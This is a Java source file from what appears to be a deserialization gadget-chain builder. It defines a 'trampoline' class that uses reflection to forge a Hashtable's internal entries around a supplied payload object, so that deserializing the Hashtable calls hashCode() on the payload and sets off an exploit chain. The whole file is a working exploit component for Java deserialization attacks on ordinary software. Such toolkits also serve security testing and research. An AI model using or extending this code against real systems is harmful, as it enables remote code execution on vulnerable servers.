package org.ses.gadgetbuilder.impl.trampolines.hashcode;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.Hashtable;

@Authors(Authors.BofeiC)
public class HashCodeHashTableTrampoline implements HashCodeTrampoline {
    @Override
    public Object wrapPayload(Object payload) throws Exception {
        return wrapPayload(new Object[] {payload});
    }

    public Object wrapPayload(Object ... params) throws Exception{
        Hashtable s = new Hashtable();
        Reflections.setFieldValue(s, "count", params.length);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.Hashtable$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.Hashtable$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, params.length);
        for (int i = 0; i < params.length; i++) {
            Array.set(tbl, i, nodeCons.newInstance(0, params[i], params[i], null));
        }
        Reflections.setFieldValue(s, "table", tbl);

        return s;
    }
}
